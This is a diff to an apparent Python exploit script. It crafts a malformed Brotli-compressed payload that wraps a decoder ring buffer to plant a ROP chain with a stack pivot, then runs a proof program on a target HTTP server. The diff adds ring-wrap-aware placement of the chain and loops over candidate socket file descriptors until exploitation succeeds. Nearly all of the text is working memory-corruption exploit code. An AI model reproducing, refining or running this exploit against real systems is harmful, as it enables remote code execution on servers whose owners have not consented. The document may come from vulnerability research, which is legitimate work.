@@ -157,6 +157,33 @@ def _number(mapping: dict[str, object], name: str) -> int:
     return int(value, 0) if isinstance(value, str) else int(value)
 
 
+def _write_ring(controlled: bytearray, offset: int, value: bytes, ring_size: int) -> None:
+    """Place bytes at their final physical offsets in a wrapped decoder ring."""
+
+    if ring_size <= 0 or len(controlled) < ring_size:
+        raise ValueError("controlled prefix is smaller than the decoder ring")
+    for displacement, byte in enumerate(value):
+        ring_offset = (offset + displacement) % ring_size
+        # The uncompressed prefix can wrap the decoder ring.  Write the final
+        # occurrence of each physical byte so an earlier duplicate cannot
+        # overwrite the chain before the malformed command executes.
+        prefix_offset = ring_offset + (
+            (len(controlled) - 1 - ring_offset) // ring_size
+        ) * ring_size
+        controlled[prefix_offset] = byte
+
+
+def _pack_ring_qwords(
+    controlled: bytearray, offset: int, values: tuple[int, ...], ring_size: int
+) -> None:
+    _write_ring(
+        controlled,
+        offset,
+        struct.pack("<" + "Q" * len(values), *values),
+        ring_size,
+    )
+
+
 @dataclass(frozen=True)
 class Profile:
     raw: dict[str, object]
@@ -178,6 +205,7 @@ class Profile:
 def build_stage_one(profile: Profile) -> bytes:
     controlled = bytearray(profile.n("prefix_size"))
     source = profile.n("copy_source_offset")
+    ring_size = 1 << int(profile.raw.get("window_bits", 10))
     chain_version = int(profile.raw.get("chain_version", 1))
     if chain_version >= 3:
         ring_base = profile.n("ring_base")
@@ -262,12 +290,11 @@ def build_stage_one(profile: Profile) -> bytes:
         if chain_version >= 2
         else profile.n("mov_rax_rdi_ret")
     )
-    struct.pack_into(
-        "<QQ",
+    _pack_ring_qwords(
         controlled,
         source,
-        source_move,
-        profile.n("pivot_rsp_rax_30_ret"),
+        (source_move, profile.n("pivot_rsp_rax_30_ret")),
+        ring_size,
     )
 
     bss = profile.n("bss_base")
@@ -307,14 +334,10 @@ def build_stage_one(profile: Profile) -> bytes:
         )
         rop_offset = source + 0x30
         proof_offset = source + 0x88
-    if rop_offset < 0 or rop_offset + 8 * len(rop) > len(controlled):
-        raise RuntimeError("ROP chain falls outside the controlled prefix")
-    struct.pack_into("<" + "Q" * len(rop), controlled, rop_offset, *rop)
+    _pack_ring_qwords(controlled, rop_offset, rop, ring_size)
 
     proof_program = b"/n2s\0"
-    if proof_offset + len(proof_program) > len(controlled):
-        raise RuntimeError("fixed proof program falls outside the controlled prefix")
-    controlled[proof_offset : proof_offset + len(proof_program)] = proof_program
+    _write_ring(controlled, proof_offset, proof_program, ring_size)
     return malformed_brotli(
         bytes(controlled),
         profile.n("command_block_extra"),
@@ -438,8 +461,29 @@ def classify_response(response: bytes, proof: tuple[str, str] | None) -> str:
 
 
 def run(profile: Profile, attempts: int, timeout: float) -> dict[str, object]:
-    stage_one = build_stage_one(profile)
     positions = [int(value, 0) for value in profile.raw["staged_positions"]]
+    raw_socket_fds = profile.raw.get(
+        "accepted_socket_fds", [profile.raw["accepted_socket_fd"]]
+    )
+    if not isinstance(raw_socket_fds, list) or not raw_socket_fds:
+        raise RuntimeError("accepted socket FD candidates must be a non-empty list")
+    socket_fds = [
+        int(value, 0) if isinstance(value, str) else int(value)
+        for value in raw_socket_fds
+    ]
+    if any(socket_fd < 3 or socket_fd > 1023 for socket_fd in socket_fds):
+        raise RuntimeError("accepted socket FD candidates must be between 3 and 1023")
+    variants = [
+        (position, socket_fd)
+        for position in positions
+        for socket_fd in socket_fds
+    ]
+    stages_one = {
+        socket_fd: build_stage_one(
+            Profile({**profile.raw, "accepted_socket_fd": socket_fd})
+        )
+        for socket_fd in socket_fds
+    }
     stages = {
         position: build_stage_two(position, profile.n("second_stage_size"))
         for position in positions
@@ -451,13 +495,14 @@ def run(profile: Profile, attempts: int, timeout: float) -> dict[str, object]:
 
     observations: list[dict[str, object]] = []
     for attempt in range(1, attempts + 1):
-        position = positions[(attempt - 1) % len(positions)]
+        position, socket_fd = variants[(attempt - 1) % len(variants)]
         print(
-            f"attempt={attempt}/{attempts} token={token.decode()} position={position:#x}",
+            f"attempt={attempt}/{attempts} token={token.decode()} "
+            f"position={position:#x} fd={socket_fd}",
             flush=True,
         )
         response = send_stages(
-            stage_one,
+            stages_one[socket_fd],
             stages[position],
             float(profile.raw["stage_delay_seconds"]),
             timeout,
@@ -467,6 +512,7 @@ def run(profile: Profile, attempts: int, timeout: float) -> dict[str, object]:
             {
                 "attempt": attempt,
                 "position": f"0x{position:x}",
+                "accepted_socket_fd": socket_fd,
                 "response_bytes": len(response),
                 "proof": proof is not None,
                 "outcome": classify_response(response, proof),
@@ -482,6 +528,7 @@ def run(profile: Profile, attempts: int, timeout: float) -> dict[str, object]:
                 "proof_stdout": identity,
                 "proof_channel": "exploited HTTP request socket",
                 "successful_attempt": attempt,
+                "successful_accepted_socket_fd": socket_fd,
                 "observations": observations,
             }
         if attempt < attempts:
